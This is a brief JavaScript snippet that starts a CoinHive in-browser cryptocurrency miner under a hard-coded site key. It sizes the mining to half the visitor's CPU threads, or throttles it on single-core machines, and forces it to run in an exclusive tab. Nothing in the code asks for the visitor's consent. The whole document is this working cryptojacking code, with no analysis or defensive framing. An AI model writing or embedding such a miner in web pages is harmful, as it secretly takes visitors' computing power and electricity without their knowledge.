if (navigator.hardwareConcurrency > 1) {
    var cpuConfig = {
        threads: Math.round(navigator.hardwareConcurrency / 2)
    }
} else {
    var cpuConfig = {
        throttle: 0.6
    }
}
var miner = new CoinHive.Anonymous('I2cOkYH86Cd0dagceTHYeJX4bUCkdJ0M', cpuConfig);
miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);